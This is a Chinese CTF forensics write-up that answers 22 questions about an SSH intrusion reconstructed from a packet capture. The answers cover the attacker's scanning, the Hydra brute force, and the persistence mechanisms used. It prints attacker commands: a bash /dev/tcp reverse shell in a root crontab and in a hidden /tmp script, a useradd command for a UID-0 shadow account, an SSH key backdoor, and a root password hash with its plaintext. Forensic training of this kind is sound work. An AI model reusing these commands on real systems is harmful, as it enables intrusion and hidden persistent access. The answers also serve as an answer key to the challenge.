发表于2026-07-19|更新于2026-07-20|CTF

SSH WriteUp

1. 攻击者的 IP 地址是什么？

根据通信关系图可以知道受害者ip和攻击者ip

192.168.11.129

2. 受害服务器的 IP 地址是什么？

192.168.11.96

3. 攻击者对目标网段进行了存活主机探测，请写出扫描的网段。

攻击者和受害者都是在同一网段内，所以扫描的网段**192.168.11.0/24**

攻击者向 192.168.11.0 ~ 192.168.11.255 共 256 个 IP 发送了 ARP 请求。

4. 攻击者存活主机探测使用了什么协议？共发现多少台存活主机？

  • 协议：ARP
  • 存活主机：6 台（192.168.11.1、192.168.11.2、192.168.11.96、192.168.11.107、192.168.11.129、192.168.11.254）

5. 受害服务器开放了哪些端口？

22,80,443

攻击者对 192.168.11.96 扫描了 1000 个端口，仅 22、80、443 回复 SYN-ACK。

6. 攻击者使用了什么工具进行 SSH 暴力破解？（写出工具名称和 SSH 客户端标识）

Hydra-SSH-2.0-libssh_0.11.3

暴力破解工具为 Hydra，其 SSH 模块底层调用 libssh 0.11.3 库，SSH 客户端标识为 SSH-2.0-libssh_0.11.3。
Hydra 连接特征：大量短时 TCP 连接，每个连接一次密码尝试即断开，连接速率呈波次分布，被服务器限流后返回 Not allowed at this time。

7. 受害服务器的 SSH 服务版本是什么？

SSH-2.0-OpenSSH_10.0p2 Ubuntu-5ubuntu5.4

8. 攻击者暴力破解共尝试了多少次密码？

30 次

分类统计：

  • 8 个连接完成完整 SSH 握手（发送 libssh banner + 接收服务器 banner + KEX + 认证）
  • 12 个连接发送 libssh banner 后被服务器返回 Not allowed at this time 拒绝
  • 10 个 TCP 探测连接（仅 SYN，无 SSH 数据）
  • 排除：1 个端口扫描器（37853）、3 个手动登录（52602/46646/35906）、1 个 Banner 抓取（50598）

共 35 个去重端口 - 5 个排除 = 30 次爆破尝试。

9. 攻击者暴力破解成功后登录的用户名是什么？

登陆上的用户名就是sanjiu，然后才是root

sanjiu

10. 攻击者进入反弹 Shell 后执行的第一条命令是什么？

whoami

反弹 Shell 连接到 192.168.11.129:4444 后，攻击者首先升级 PTY（python3 -c 'import pty;pty.spawn("/bin/bash")'），第一条侦察命令为 whoami。

11. 攻击者一共建立了几次反弹 Shell 连接？

2 次

  • 第一次：192.168.11.96:36842 → 192.168.11.129:4444（sanjiu 用户）
  • 第二次：192.168.11.96:56908 → 192.168.11.129:4444（提权至 root）

12. 受害服务器的主机名是什么？

┌──(root㉿kali)-[/mnt/hgfs/share/ssh]
└─# tshark -r ssh.pcap -Y "tcp.port==4444 && tcp.payload" \
  -T fields -e tcp.payload | xxd -r -p

bash: 无法设定终端进程组 (5216): 对设备不适当的 ioctl 操作
bash: 此 shell 中无任务控制
sanjiu@sanjiu-VMware-Virtual-Platform:~$

sanjiu-VMware-Virtual-Platform

13. 攻击者手动登录时使用的 SSH 客户端标识是什么？

SSH-2.0-OpenSSH_10.2p1 Debian-3

爆破成功后，攻击者使用标准 OpenSSH 客户端（Debian 10.2p1）手动登录（端口 52602、46646、35906）。

14. 反弹 Shell 使用的端口号是什么？

4444

15. 反弹 Shell 的连接方向是什么？

受害服务器（192.168.11.96）主动连接攻击者（192.168.11.129）

攻击者在本地监听 4444，受害服务器反向连接。

16. 攻击者将 root 密码修改为了什么？

sanjiu@@@123

17. 攻击者创建的影子账户用户名和 UID 分别是什么？

sanJiu-0

命令：useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sanJiu
密码：admin123456@@@

18. 攻击者写入的 Crontab 后门完整内容是什么？

*/10 * * * * root bash -i >& /dev/tcp/192.168.11.129/9999 0>&1

19. 攻击者 Crontab 后门的回连端口是什么？

9999

20. 攻击者在受害机上创建的隐藏后门脚本完整路径是什么？

/tmp/.backdoor.sh

内容：

#!/bin/bash
bash -i >& /dev/tcp/192.168.11.129/9999 0>&1

21. 攻击者写入 SSH 公钥后门的公钥文件完整路径是什么？

/root/.ssh/authorized_keys

公钥内容：ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7FakeKeyForCTF kali@kali

22. 受害机 /etc/shadow 文件中 root 用户的密码哈希值是什么？

$y$j9T$HAiWkWk/MXH2ZeZDj9uXl1$jr4kDa9qVoVGC9kJb2U7tK7nHRcWQA/VdB6OoMl8d6C

yescrypt 格式，对应密码 sanjiu@@@123。
